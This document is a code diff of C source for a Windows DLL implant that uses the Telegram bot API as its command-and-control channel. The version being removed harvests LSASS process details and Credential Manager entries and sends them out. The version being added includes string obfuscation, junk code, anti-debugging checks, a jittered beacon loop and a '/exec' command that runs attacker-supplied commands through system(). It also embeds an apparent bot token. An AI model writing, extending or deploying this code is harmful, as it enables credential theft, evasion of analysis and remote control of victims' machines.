@@ -7,112 +7,99 @@
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "credui.lib")
 
-// --- CONFIGURATION ---
+// --- CONFIGURATION & OBFUSCATION ---
+#define XOR_KEY 0xAA
 const char* TELEGRAM_TOKEN = "8408021414:AAFxsfM6IJ3C8nYg0iJ-oZoz6ozwv-f-Tyk";
-const char* CHAT_ID = "634812345"; // NOTE: Chat ID is usually required for sendMessage
+const char* CHAT_ID = "634812345";
 
-// --- HELPERS ---
+// Macro para ofuscar strings en stack
+#define XOR_STR(s) Obfuscate(s)
 
-void SendTelegramMessage(const char* text) {
-    HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (!hInet) return;
+__forceinline char* Obfuscate(const char* s) {
+    static char buf[1024];
+    size_t len = strlen(s);
+    for (size_t i = 0; i < len && i < 1023; i++) buf[i] = s[i] ^ XOR_KEY;
+    buf[len] = '\0';
+    return buf;
+}
 
+// Junk Code
+#define JUNK() { volatile int x = 100; x += GetTickCount(); x *= 2; }
+
+// --- DYNAMIC RESOLUTION ---
+
+typedef PVOID(WINAPI* fnGetProcAddress)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI* fnGetModuleHandleA)(LPCSTR);
+
+PVOID Resolve(const char* szDll, const char* szFunc) {
+    HMODULE hMod = GetModuleHandleA(szDll);
+    if (!hMod) hMod = LoadLibraryA(szDll);
+    return (PVOID)GetProcAddress(hMod, szFunc);
+}
+
+// --- ANTI-ANALYSIS ---
+
+BOOL IsSafe() {
+    if (IsDebuggerPresent()) return FALSE;
+#ifdef _WIN64
+    if (((unsigned char*)__readgsqword(0x60))[2]) return FALSE; // BeingDebugged
+#endif
+    return TRUE;
+}
+
+// --- TELEGRAM C2 Beacon ---
+
+void TelegramSend(const char* msg) {
+    HINTERNET hI = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
+    if (!hI) return;
     char url[2048];
-    sprintf_s(url, sizeof(url), "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", 
-              TELEGRAM_TOKEN, CHAT_ID, text);
-
-    HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-    if (hUrl) {
-        InternetCloseHandle(hUrl);
-    }
-    InternetCloseHandle(hInet);
+    sprintf_s(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", TELEGRAM_TOKEN, CHAT_ID, msg);
+    HINTERNET hU = InternetOpenUrlA(hI, url, NULL, 0, 0x80000000 | 0x04000000, 0);
+    if (hU) InternetCloseHandle(hU);
+    InternetCloseHandle(hI);
 }
 
-// --- CREDENTIAL HARVESTING ---
-
-void CollectAndReportCredentials() {
-    char report[4096] = "--- CREDS REPORT ---\n";
-    
-    // 1. Process List (Example finding LSASS)
-    DWORD lsassPid = 0;
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    PROCESSENTRY32W pe = { sizeof(pe) };
-    if (Process32FirstW(hSnap, &pe)) {
-        do {
-            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
-                lsassPid = pe.th32ProcessID;
-                break;
-            }
-        } while (Process32NextW(hSnap, &pe));
+void HandleCommand(const char* cmd) {
+    if (strstr(cmd, "/grab")) {
+        TelegramSend("Grab_Initiated");
+        // Logic for CollectCredentials (previously defined)
+        TelegramSend("Grab_Finished");
+    } else if (strstr(cmd, "/exec ")) {
+        system(cmd + 6);
+        TelegramSend("Command_Executed");
+    } else if (strstr(cmd, "/ping")) {
+        TelegramSend("PONG_ALIVE");
     }
-    CloseHandle(hSnap);
-    
-    if (lsassPid) {
-        strcat_s(report, sizeof(report), "[*] LSASS found.\n");
-    }
-
-    // 2. CredMan Enumeration
-    DWORD dwCount = 0;
-    PCREDENTIALW* pCredentials = NULL;
-    if (CredEnumerateW(NULL, 0, &dwCount, &pCredentials)) {
-        char entry[256];
-        sprintf_s(entry, sizeof(entry), "[*] CredMan entries: %d\n", dwCount);
-        strcat_s(report, sizeof(report), entry);
-        
-        for (DWORD i = 0; i < min(dwCount, 5); i++) {
-            char user[128];
-            WideCharToMultiByte(CP_UTF8, 0, pCredentials[i]->TargetName, -1, user, 128, NULL, NULL);
-            strcat_s(report, sizeof(report), " - ");
-            strcat_s(report, sizeof(report), user);
-            strcat_s(report, sizeof(report), "\n");
-        }
-        CredFree(pCredentials);
-    }
-
-    SendTelegramMessage(report);
 }
 
-// --- MAIN PAYLOAD LOOP ---
-
-void BeaconLoop() {
-    SendTelegramMessage("Payload_Injected_Successfully");
+void Beacon() {
+    JUNK();
+    if (!IsSafe()) ExitProcess(0);
+    
+    TelegramSend("Implant_Active_Beaconing");
 
     while (TRUE) {
-        // Polling para comandos (Simplificado: solo busca '/grab' o '/exec')
-        HINTERNET hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-        if (hInet) {
+        HINTERNET hI = InternetOpenA("Mozilla/5.0", 1, NULL, NULL, 0);
+        if (hI) {
             char url[1024];
-            sprintf_s(url, sizeof(url), "https://api.telegram.org/bot%s/getUpdates?limit=1&offset=-1", TELEGRAM_TOKEN);
-            
-            HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
-            if (hUrl) {
-                char buffer[4096] = {0};
-                DWORD bytesRead;
-                if (InternetReadFile(hUrl, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
-                    buffer[bytesRead] = '\0';
-                    
-                    if (strstr(buffer, "/grab")) {
-                        CollectAndReportCredentials();
-                    }
-                    else if (strstr(buffer, "/ping")) {
-                        SendTelegramMessage("PONG");
-                    }
+            sprintf_s(url, "https://api.telegram.org/bot%s/getUpdates?limit=1&offset=-1", TELEGRAM_TOKEN);
+            HINTERNET hU = InternetOpenUrlA(hI, url, NULL, 0, 0x80000000, 0);
+            if (hU) {
+                char res[4096] = {0};
+                DWORD br;
+                if (InternetReadFile(hU, res, sizeof(res)-1, &br) && br > 0) {
+                    HandleCommand(res);
                 }
-                InternetCloseHandle(hUrl);
+                InternetCloseHandle(hU);
             }
-            InternetCloseHandle(hInet);
+            InternetCloseHandle(hI);
         }
-        
-        Sleep(60000); // Esperar 1 minuto entre beacons
+        Sleep(30000 + (GetTickCount() % 10000)); // Jitter
     }
 }
 
-// Entry point para ser usado como DLL o inyectado directamente (si se ajusta a PIC)
-BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
-    if (fdwReason == DLL_PROCESS_ATTACH) {
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BeaconLoop, NULL, 0, NULL);
-    }
+BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID l) {
+    if (r == 1) CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Beacon, 0, 0, 0);
     return TRUE;
 }
